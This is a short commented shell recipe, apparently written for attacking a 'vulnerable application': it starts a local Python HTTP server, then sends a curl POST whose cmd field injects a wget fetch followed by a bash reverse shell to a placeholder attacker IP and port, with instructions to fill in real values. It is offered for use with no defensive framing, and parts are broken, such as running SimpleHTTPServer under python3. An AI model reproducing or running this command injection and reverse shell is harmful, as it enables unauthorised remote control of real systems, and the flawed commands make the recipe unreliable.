# First, start a Python HTTP server in the background on the chosen port.
# This example uses port 8080. You may need to change 'python3' to 'python' depending on your system.
python3 -m SimpleHTTPServer 8080 &

# Next, construct the curl POST request, specifying the local server's URL (including the port) where the server was started.
# It's important to replace <attacker_ip> and <attacker_port> with the actual IP address and port you want the reverse shell to connect back to.
# Also, replace <port> with the actual port that the vulnerable application is listening on.
curl -X POST -d "cmd=wget --wait=2 --limit-rate=20K --recursive --page-requisites --user-agent=Mozilla --no-parent --convert-links --adjust-extension --no-clobber -e robots=off http://127.0.0.1:8080/ && bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1" http://localhost:<port>/data/local/tmp/misc/rsh


#   These commands do the following:
#   - Start a Python HTTP server at `http://127.0.0.1:8080/` to serve files from the current directory.
#   - Use `curl` to send a POST request to a target URL with a payload to download resources from the Python server and then attempt to create a reverse shell back to the attacker's machine.

#   Remember to replace placeholders like `<attacker_ip>`, `<attacker_port>`, and `<port>` with the appropriate values.
